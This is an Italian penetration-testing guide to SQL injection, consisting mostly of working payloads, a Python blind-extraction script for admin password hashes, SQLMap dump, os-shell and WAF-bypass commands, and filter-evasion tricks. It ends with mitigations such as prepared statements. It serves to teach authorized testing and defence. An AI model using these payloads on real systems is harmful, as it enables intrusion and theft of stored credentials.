# SQL Injection

## Scopo

Questa guida copre le vulnerabilità SQL Injection, tecniche di exploitation e metodologie di testing per penetration test su applicazioni web.

## Prerequisiti

- Conoscenza base SQL
- Burp Suite o proxy HTTP
- SQLMap
- Ambiente di test (DVWA, SQLi-labs)
- **Autorizzazione per testing**

## Installazione

```bash
sudo apt-get update
sudo apt-get install sqlmap
```

---

## Tipi di SQL Injection

| Tipo | Descrizione | Detection |
|------|-------------|-----------|
| In-band (Classic) | Risultato nella risposta | Facile |
| Error-based | Errori rivelano info | Facile |
| Union-based | UNION per estrarre dati | Moderato |
| Blind Boolean | True/False response | Difficile |
| Blind Time-based | Delay nella risposta | Difficile |
| Out-of-band | DNS/HTTP exfiltration | Difficile |

---

## Detection

### Manual Testing

```sql
# Singolo quote
'
"

# Commenti
--
#
/**/

# Boolean
' OR '1'='1
' OR '1'='2
" OR "1"="1

# Aritmetica
' AND 1=1--
' AND 1=2--

# Time-based
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Burp Suite

```
1. Intercetta request
2. Invia a Repeater/Intruder
3. Test payloads su parametri
4. Osserva differenze response
```

---

## Error-Based Injection

### MySQL

```sql
# Estrai versione
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--

# Database corrente
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
```

### MSSQL

```sql
# Errore conversione
' AND 1=CONVERT(int,(SELECT @@version))--

# Alternativa
' AND 1=CAST((SELECT @@version) AS int)--
```

### PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--
```

---

## Union-Based Injection

### Trovare Numero Colonne

```sql
# ORDER BY method
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  # Errore = 2 colonne

# UNION NULL method
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Estrazione Dati

```sql
# MySQL
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Con GROUP_CONCAT
' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL FROM users--
```

---

## Blind Boolean-Based

### Tecnica

```sql
# True condition
' AND 1=1--    # Response normale

# False condition
' AND 1=2--    # Response diversa

# Estrai carattere per carattere
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--
```

### Script Automatizzato

```python
import requests

url = "http://target/search.php"
chars = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for i in range(1, 33):  # Assume 32 char hash
    for c in chars:
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{i},1)='{c}'--"
        r = requests.get(url, params={"id": payload})
        if "found" in r.text:
            password += c
            print(f"Found: {password}")
            break
```

---

## Blind Time-Based

### MySQL

```sql
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
```

### MSSQL

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
```

### PostgreSQL

```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## SQLMap

### Scansione Base

```bash
# GET parameter
sqlmap -u "http://target/page.php?id=1"

# POST data
sqlmap -u "http://target/login.php" --data="user=admin&pass=test"

# Cookie
sqlmap -u "http://target/page.php" --cookie="session=abc123"
```

### Opzioni Utili

```bash
# Database fingerprint
sqlmap -u "URL" --fingerprint

# Lista database
sqlmap -u "URL" --dbs

# Lista tabelle
sqlmap -u "URL" -D database_name --tables

# Dump tabella
sqlmap -u "URL" -D database_name -T users --dump

# Shell
sqlmap -u "URL" --os-shell
```

### Bypass WAF

```bash
# Tamper scripts
sqlmap -u "URL" --tamper=space2comment
sqlmap -u "URL" --tamper=between
sqlmap -u "URL" --tamper=randomcase

# Random agent
sqlmap -u "URL" --random-agent

# Delay
sqlmap -u "URL" --delay=2
```

---

## Bypass Tecniche

### Spazi

```sql
# Commenti
SELECT/**/username/**/FROM/**/users

# Tab/newline
SELECT username FROM users
```

### Quote

```sql
# Hex encoding
SELECT * FROM users WHERE username=0x61646d696e

# CHAR()
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```

### Keyword Bypass

```sql
# Case variation
SeLeCt * FrOm users

# Double keyword
SELSELECTECT * FROM users

# Inline comments
SEL/**/ECT * FROM users
```

---

## Second-Order SQLi

```
1. Input malevolo salvato in DB
2. Successivamente usato in query
3. Più difficile da trovare

Esempio:
- Registrazione: username = admin'--
- Login: SELECT * FROM users WHERE username='admin'--'
```

---

## Mitigazioni

### Prepared Statements

```python
# Python - Sicuro
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# Insicuro
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

```java
// Java - Sicuro
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);
```

### Altre Protezioni

```
- Input validation (whitelist)
- Least privilege DB accounts
- WAF rules
- Error handling (no stack trace)
```

---

## Best Practices

- **Scope**: Test solo parametri autorizzati
- **Non-destructive**: Evita DROP, DELETE, UPDATE
- **Documentation**: Log tutti i test
- **Remediation**: Fornisci fix nel report
- **Retesting**: Verifica fix implementati

## Riferimenti

- [SQLMap Documentation](https://sqlmap.org/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
